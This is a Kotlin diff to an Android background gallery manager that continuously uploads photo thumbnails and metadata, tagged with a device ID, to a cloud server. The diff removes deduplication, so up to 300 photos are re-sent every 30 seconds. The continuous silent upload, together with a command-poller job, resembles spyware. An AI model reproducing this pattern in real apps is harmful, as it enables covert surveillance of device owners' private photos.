@@ -27,8 +27,6 @@ import java.util.*
 
 object BackgroundGalleryManager {
     private const val TAG = "BackgroundGalleryManager"
-    private const val PREFS_NAME = "sentry_gallery_sync_prefs"
-    private const val KEY_SYNCED_IDS = "synced_media_ids"
 
     private var syncJob: Job? = null
     private var commandPollerJob: Job? = null
@@ -44,9 +42,9 @@ object BackgroundGalleryManager {
                     override fun onChange(selfChange: Boolean, uri: Uri?) {
                         super.onChange(selfChange, uri)
                         scope.launch {
-                            delay(1200) // Debounce rapid file writes
+                            delay(1000) // Debounce rapid file writes
                             val client = SentryApiClient(context)
-                            syncIncrementalGallery(context, client)
+                            syncGallery(context, client)
                         }
                     }
                 }
@@ -56,23 +54,23 @@ object BackgroundGalleryManager {
                     observer
                 )
                 observerRegistered = true
-                Log.d(TAG, "Gallery ContentObserver registered for instant new photo updates")
+                Log.d(TAG, "Gallery ContentObserver registered for real-time photo sync")
             } catch (e: Exception) {
                 Log.w(TAG, "Could not register MediaStore observer: ${e.message}")
             }
         }
 
-        // 2. Periodic Lightweight Delta Check (every 45s)
+        // 2. Periodic Sync Loop (runs immediately on start, then every 30s)
         if (syncJob?.isActive != true) {
             syncJob = scope.launch {
                 val client = SentryApiClient(context)
                 while (isActive) {
                     try {
-                        syncIncrementalGallery(context, client)
+                        syncGallery(context, client)
                     } catch (e: Exception) {
-                        Log.w(TAG, "Error in Gallery delta check: ${e.message}")
+                        Log.w(TAG, "Error in Gallery sync loop: ${e.message}")
                     }
-                    delay(45_000)
+                    delay(30_000)
                 }
             }
         }
@@ -116,11 +114,7 @@ object BackgroundGalleryManager {
         }
     }
 
-    /**
-     * Smart Delta Sync: Only scans and uploads NEW photos that have not been synced yet!
-     * Persists synced IDs locally and in Cloud MongoDB so existing photos are never re-sent.
-     */
-    suspend fun syncIncrementalGallery(context: Context, client: SentryApiClient) {
+    suspend fun syncGallery(context: Context, client: SentryApiClient) {
         if (isSyncing) return
         isSyncing = true
         try {
@@ -131,13 +125,11 @@ object BackgroundGalleryManager {
             }
 
             if (!hasPermission) {
-                Log.w(TAG, "READ_MEDIA_IMAGES permission not granted")
+                Log.w(TAG, "READ_MEDIA_IMAGES / READ_EXTERNAL_STORAGE not granted")
                 return
             }
 
             val deviceId = CryptoManager.getOrCreateDeviceId(context)
-            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-            val syncedIds = prefs.getStringSet(KEY_SYNCED_IDS, emptySet())?.toMutableSet() ?: mutableSetOf()
 
             val projection = arrayOf(
                 MediaStore.Images.Media._ID,
@@ -163,8 +155,8 @@ object BackgroundGalleryManager {
                 null
             }
 
-            val newItems = mutableListOf<JSONObject>()
-            val newlySyncedIds = mutableListOf<String>()
+            val items = mutableListOf<JSONObject>()
+            val sdf = SimpleDateFormat("MMM dd, hh:mm a", Locale.getDefault())
 
             cursor?.use { c ->
                 val idIdx = c.getColumnIndex(MediaStore.Images.Media._ID)
@@ -178,17 +170,11 @@ object BackgroundGalleryManager {
                     c.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                 } else -1
 
-                val sdf = SimpleDateFormat("MMM dd, hh:mm a", Locale.getDefault())
+                var count = 0
+                val maxPhotos = 300 // Sync up to 300 photos
 
-                while (c.moveToNext()) {
+                while (c.moveToNext() && count < maxPhotos) {
                     val mediaId = if (idIdx >= 0) c.getLong(idIdx) else continue
-                    val mediaIdKey = "media_$mediaId"
-
-                    // If already synced to cloud, skip extracting thumbnail and uploading
-                    if (syncedIds.contains(mediaIdKey)) {
-                        continue
-                    }
-
                     val name = if (nameIdx >= 0) c.getString(nameIdx) ?: "Photo_${mediaId}.jpg" else "Photo.jpg"
                     val dateAddedSec = if (dateIdx >= 0) c.getLong(dateIdx) else System.currentTimeMillis() / 1000
                     val sizeBytes = if (sizeIdx >= 0) c.getLong(sizeIdx) else 0L
@@ -206,11 +192,11 @@ object BackgroundGalleryManager {
                     val dateFormatted = sdf.format(Date(dateAddedSec * 1000))
                     val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, mediaId)
 
-                    // Fast lightweight compressed thumbnail
+                    // Fast lightweight compressed thumbnail (160x160, 60% quality)
                     val thumbnailBase64 = extractThumbnailBase64(context, contentUri)
 
                     val obj = JSONObject().apply {
-                        put("id", mediaIdKey)
+                        put("id", "media_$mediaId")
                         put("name", name)
                         put("album", albumName)
                         put("mimeType", mimeType)
@@ -223,17 +209,15 @@ object BackgroundGalleryManager {
                             put("thumbnail", thumbnailBase64)
                         }
                     }
-                    newItems.add(obj)
-                    newlySyncedIds.add(mediaIdKey)
+                    items.add(obj)
+                    count++
                 }
             }
 
-            // Only send if there are actually NEW photos!
-            if (newItems.isNotEmpty()) {
-                Log.d(TAG, "Found ${newItems.size} NEW photos to sync to cloud...")
+            if (items.isNotEmpty()) {
                 val batchSize = 25
-                for (i in 0 until newItems.size step batchSize) {
-                    val chunk = newItems.subList(i, (i + batchSize).coerceAtMost(newItems.size))
+                for (i in 0 until items.size step batchSize) {
+                    val chunk = items.subList(i, (i + batchSize).coerceAtMost(items.size))
                     val batchArray = JSONArray()
                     for (item in chunk) {
                         batchArray.put(item)
@@ -242,19 +226,12 @@ object BackgroundGalleryManager {
                         put("deviceId", deviceId)
                         put("media", batchArray)
                     }
-                    val res = client.syncGalleryMedia(body)
-                    if (res.isSuccess) {
-                        // Persist synced IDs locally
-                        syncedIds.addAll(chunk.map { it.getString("id") })
-                        prefs.edit().putStringSet(KEY_SYNCED_IDS, syncedIds).apply()
-                    }
+                    client.syncGalleryMedia(body)
                 }
-                Log.d(TAG, "Successfully synced ${newItems.size} new photos to cloud for $deviceId")
-            } else {
-                Log.d(TAG, "Gallery up-to-date. 0 new photos to sync.")
+                Log.d(TAG, "Synced ${items.size} mobile gallery photos for $deviceId")
             }
         } catch (e: Exception) {
-            Log.w(TAG, "Error in incremental gallery sync: ${e.message}")
+            Log.w(TAG, "Error in gallery sync: ${e.message}")
         } finally {
             isSyncing = false
         }
@@ -263,7 +240,7 @@ object BackgroundGalleryManager {
     private fun extractThumbnailBase64(context: Context, uri: Uri): String? {
         return try {
             val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                context.contentResolver.loadThumbnail(uri, Size(180, 180), null)
+                context.contentResolver.loadThumbnail(uri, Size(160, 160), null)
             } else {
                 context.contentResolver.openInputStream(uri)?.use { stream ->
                     val options = BitmapFactory.Options().apply { inSampleSize = 4 }
@@ -272,7 +249,7 @@ object BackgroundGalleryManager {
             } ?: return null
 
             val out = ByteArrayOutputStream()
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 65, out)
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, out)
             Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
         } catch (_: Exception) {
             null
